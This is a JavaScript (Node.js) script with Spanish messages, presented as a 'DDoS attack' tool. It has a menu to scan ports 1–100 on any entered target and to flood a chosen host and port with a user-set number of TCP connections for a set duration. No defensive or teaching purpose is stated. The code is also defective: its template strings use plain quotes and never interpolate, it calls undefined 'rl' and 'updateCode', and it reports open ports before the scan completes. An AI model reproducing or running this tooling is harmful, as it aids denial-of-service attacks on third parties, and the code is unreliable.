const net = require('net');

const portScan = async (target) => {
try {
console.log('[36m Iniciando escaneo de puertos...');
const ports = [];
for (let i = 1; i <= 100; i++) {
const socket = new net.Socket();
socket.connect(i, target, () => {
console.log('[32m Puerto abierto: ${i}');
ports.push(i);
});
socket.on('error', (err) => {
//console.error('Error: ${err}');
});
}
console.log('[36m Escaneo de puertos finalizado. Puertos abiertos: ${ports.join(', ')});
} catch (error) {
console.error('Error: ${error}');
}
};

const ddosAttack = async (target, port, numConnections, attackDuration) => {
try {
console.log('[36m Iniciando ataque DDoS...');
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(port, target, () => {
console.log('[31m Conectado a ${target}:${port}');
});
socket.on('data', (data) => {
console.log('Dato recibido de ${target}:${port}');
});
socket.on('error', (err) => {
console.error('Error: ${err}');
});
sockets.push(socket);
}

setTimeout(() => {
console.log('Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error('Error: ${error}');
}
};

const showMenu = () => {
console.clear(); // Limpiar la consola
console.log('[31m         DDoS attack    ');
console.log('⭐️ Desarrollado por Keiji821');
console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺');
console.log('1. Iniciar ataque DDoS');
console.log('2. Escanear puertos abiertos');
console.log('3. Actualizar código');
console.log('4. Salir');

rl.question('Seleccione una opción: ', (answer) => {
switch (answer) {
case '1':
rl.question('Ingrese la dirección IP o dominio del objetivo: ', (target) => {
rl.question('Ingrese el puerto del objetivo: ', (port) => {
rl.question('Ingrese el número de conexiones: ', (numConnections) => {
rl.question('Ingrese la duración del ataque (en segundos): ', (attackDuration) => {
ddosAttack(target, port, numConnections, attackDuration);
});
});
});
break;
case '2':
rl.question('Ingrese la dirección IP o dominio del objetivo: ', (target) => {
portScan(target);
});
break;
case '3':
updateCode();
break;
case '4':
console.log('Saliendo...');
process.exit();
break;
default:
console.log('Opción inválida. Intente nuevamente.');
showMenu();
}
});
};